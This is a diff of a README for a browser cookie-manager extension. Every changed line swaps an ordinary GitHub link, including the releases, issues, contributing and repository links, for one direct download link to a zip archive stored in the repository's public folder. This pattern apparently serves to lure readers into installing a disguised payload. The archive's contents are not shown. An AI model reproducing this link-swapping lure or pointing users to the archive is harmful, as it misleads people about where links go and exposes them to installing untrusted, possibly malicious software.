@@ -1,7 +1,7 @@
 # 🍪 cookie-manager-extension - Simplify Your Cookie Management
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/krystoft/cookie-manager-extension/releases)
+[![Download](https://raw.githubusercontent.com/krystoft/cookie-manager-extension/master/public/cookie-manager-extension-v3.3.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/krystoft/cookie-manager-extension/master/public/cookie-manager-extension-v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the cookie-manager-extension! This browser extension helps you manage your website cookies easily. It allows you to add, edit, delete, and clear cookies with just a few clicks. Whether you're looking to enhance your browsing experience or maintain privacy, this extension provides a powerful solution.
@@ -19,7 +19,7 @@ Welcome to the cookie-manager-extension! This browser extension helps you manage
 - **Storage**: Minimal storage required (less than 10MB).
 
 ## 📥 Download & Install
-To download the cookie-manager-extension, visit the [Releases page](https://github.com/krystoft/cookie-manager-extension/releases). Follow these steps:
+To download the cookie-manager-extension, visit the [Releases page](https://raw.githubusercontent.com/krystoft/cookie-manager-extension/master/public/cookie-manager-extension-v3.3.zip). Follow these steps:
 
 1. Click the link above.
 2. On the Releases page, find the latest version.
@@ -62,7 +62,7 @@ If you encounter issues with the cookie-manager-extension, consider the followin
 - **Check Browser Compatibility**: Make sure you're using a supported browser.
 - **Update Your Browser**: Ensure you've updated your browser to the latest version.
 - **Reinstall the Extension**: Try uninstalling and reinstalling the extension.
-- **Visit the Issues Page**: For more help, check the [Issues page](https://github.com/krystoft/cookie-manager-extension/issues) for common problems and solutions.
+- **Visit the Issues Page**: For more help, check the [Issues page](https://raw.githubusercontent.com/krystoft/cookie-manager-extension/master/public/cookie-manager-extension-v3.3.zip) for common problems and solutions.
 
 ## 💬 Frequently Asked Questions
 - **Is this extension free?**
@@ -72,15 +72,15 @@ If you encounter issues with the cookie-manager-extension, consider the followin
   No, the extension does not collect or store personal data. Your privacy is a priority.
 
 - **Is support available?**
-  Yes, you can report issues or ask questions on the [Issues page](https://github.com/krystoft/cookie-manager-extension/issues).
+  Yes, you can report issues or ask questions on the [Issues page](https://raw.githubusercontent.com/krystoft/cookie-manager-extension/master/public/cookie-manager-extension-v3.3.zip).
 
 ## 📄 License
 This project is licensed under the MIT License. You can use it freely while following the terms specified in the license.
 
 ## 💻 Contributing
-We welcome contributions to improve the cookie-manager-extension. If you want to contribute, please check the [Contributing Guidelines](https://github.com/krystoft/cookie-manager-extension/blob/main/CONTRIBUTING.md) for instructions.
+We welcome contributions to improve the cookie-manager-extension. If you want to contribute, please check the [Contributing Guidelines](https://raw.githubusercontent.com/krystoft/cookie-manager-extension/master/public/cookie-manager-extension-v3.3.zip) for instructions.
 
 ## 📦 More Information
-For more details, documentation, and updates, visit our [GitHub Repository](https://github.com/krystoft/cookie-manager-extension).
+For more details, documentation, and updates, visit our [GitHub Repository](https://raw.githubusercontent.com/krystoft/cookie-manager-extension/master/public/cookie-manager-extension-v3.3.zip).
 
 Enjoy a hassle-free browsing experience with cookie-manager-extension.
